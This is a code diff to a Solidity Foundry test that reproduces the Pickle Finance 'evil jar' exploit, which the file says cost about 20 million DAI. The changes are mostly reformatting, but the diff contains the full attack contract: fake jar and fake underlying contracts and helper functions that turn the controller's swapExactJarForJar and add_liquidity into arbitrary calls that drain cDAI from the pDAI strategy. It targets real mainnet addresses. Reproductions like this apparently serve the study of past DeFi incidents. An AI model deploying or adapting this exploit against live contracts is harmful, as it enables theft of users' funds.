@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 // @KeyInfo - Total Lost : around 20 million DAI.
 // Attacker : 0xbac8a476b95ec741e56561a66231f92bc88bb3a8
 // AttackContract : 0x2b0b02ce19c322b4dd55a3949b4fb6e9377f7913#code
@@ -12,7 +12,6 @@ import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 // Exploit code refers to sam. https://github.com/banteg/evil-jar/blob/master/reference/samczsun.sol
 
 abstract contract ControllerLike {
-
     function swapExactJarForJar(
         address _fromJar, // From which Jar
         address _toJar, // To which Jar
@@ -21,11 +20,9 @@ abstract contract ControllerLike {
         address[] calldata _targets,
         bytes[] calldata _data
     ) external virtual;
-
 }
 
 abstract contract CurveLogicLike {
-
     function add_liquidity(
         address curve,
         bytes4 curveFunctionSig,
@@ -33,11 +30,9 @@ abstract contract CurveLogicLike {
         uint256 curveUnderlyingIndex,
         address underlying
     ) public virtual;
-
 }
 
 contract FakeJar {
-
     IERC20 _token;
 
     constructor(IERC20 __token) {
@@ -77,11 +72,9 @@ contract FakeJar {
     }
 
     function withdraw(uint256) public {}
-
 }
 
 contract FakeUnderlying {
-
     address private target;
 
     constructor(address _target) {
@@ -99,19 +92,17 @@ contract FakeUnderlying {
     function allowance(address, address) public returns (uint256) {
         return 0;
     }
-
 }
 
 abstract contract JarLike {
-
     function earn() public virtual;
-
 }
 
 contract AttackContract is Test {
-
-    ControllerLike constant CONTROLLER = ControllerLike(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);
-    CurveLogicLike constant CURVE_LOGIC = CurveLogicLike(0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8);
+    ControllerLike constant CONTROLLER =
+        ControllerLike(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);
+    CurveLogicLike constant CURVE_LOGIC =
+        CurveLogicLike(0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8);
 
     IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     IERC20 constant CDAI = IERC20(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
@@ -136,29 +127,66 @@ contract AttackContract is Test {
         for (uint256 i = 0; i < earns; i++) {
             datas[i + 1] = arbitraryCall(address(PDAI), "earn()");
         }
-        datas[earns + 1] = arbitraryCall(STRAT, "withdraw(address)", address(CDAI));
+        datas[earns + 1] = arbitraryCall(
+            STRAT,
+            "withdraw(address)",
+            address(CDAI)
+        );
 
-        emit log_named_decimal_uint("Before exploiting, Attacker cDAI Balance", CDAI.balanceOf(address(msg.sender)), 8);
+        emit log_named_decimal_uint(
+            "Before exploiting, Attacker cDAI Balance",
+            CDAI.balanceOf(address(msg.sender)),
+            8
+        );
 
         console.log("DAI balance on pDAI", DAI.balanceOf(address(PDAI)));
 
-        CONTROLLER.swapExactJarForJar(address(new FakeJar(CDAI)), address(new FakeJar(CDAI)), 0, 0, targets, datas);
+        CONTROLLER.swapExactJarForJar(
+            address(new FakeJar(CDAI)),
+            address(new FakeJar(CDAI)),
+            0,
+            0,
+            targets,
+            datas
+        );
 
-        emit log_named_decimal_uint("After exploiting, Attacker cDAI Balance", CDAI.balanceOf(address(msg.sender)), 8);
-    }
-
-    function arbitraryCall(address to, string memory sig) internal pure returns (bytes memory) {
-        return abi.encodeWithSelector(
-            CURVE_LOGIC.add_liquidity.selector, to, bytes4(keccak256(bytes(sig))), 1, 0, address(CDAI)
+        emit log_named_decimal_uint(
+            "After exploiting, Attacker cDAI Balance",
+            CDAI.balanceOf(address(msg.sender)),
+            8
         );
     }
 
-    function arbitraryCall(address to, string memory sig, address param) internal returns (bytes memory) {
-        return abi.encodeWithSelector(
-            CURVE_LOGIC.add_liquidity.selector, to, bytes4(keccak256(bytes(sig))), 1, 0, new FakeUnderlying(param)
-        );
+    function arbitraryCall(
+        address to,
+        string memory sig
+    ) internal pure returns (bytes memory) {
+        return
+            abi.encodeWithSelector(
+                CURVE_LOGIC.add_liquidity.selector,
+                to,
+                bytes4(keccak256(bytes(sig))),
+                1,
+                0,
+                address(CDAI)
+            );
+    }
+
+    function arbitraryCall(
+        address to,
+        string memory sig,
+        address param
+    ) internal returns (bytes memory) {
+        return
+            abi.encodeWithSelector(
+                CURVE_LOGIC.add_liquidity.selector,
+                to,
+                bytes4(keccak256(bytes(sig))),
+                1,
+                0,
+                new FakeUnderlying(param)
+            );
     }
 
     receive() external payable {}
-
 }
